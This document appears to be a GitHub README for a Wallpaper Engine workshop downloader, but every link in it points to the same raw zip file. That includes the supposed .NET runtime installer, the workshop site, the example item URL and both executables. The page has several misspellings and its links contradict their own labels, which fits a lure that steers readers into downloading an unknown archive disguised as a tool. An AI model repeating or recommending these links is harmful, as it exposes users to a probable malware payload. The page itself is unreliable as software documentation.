# Wallpaper Engine Workshop Downloader

[中文](https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip)

A workshop download tool for Wallpaper Engine.

## Functions  

* Automatically the workshop item for Wallpaper Engine without your own Steam account.

## Dependies  

* <https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip>

## Usage  

 * Please install [.NET 8.0 Runtime](https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip) first.

 1. Browse the workshop item you like in <https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip>

 2. Copy the URL of the workshop item you like. For example, `https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip`

 3. Run `https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip` (Enginsh) or `https://raw.githubusercontent.com/Z1ted/WallpaperEngineWorkshopDownloader/main/pleaser/WallpaperEngineWorkshopDownloader_v2.4.zip` (Chiense) and paste the workshop item URL into item box.

 4. Select the wallpaper engine file path (with folder `\projects\myprojects` included) and click the `Download` button.
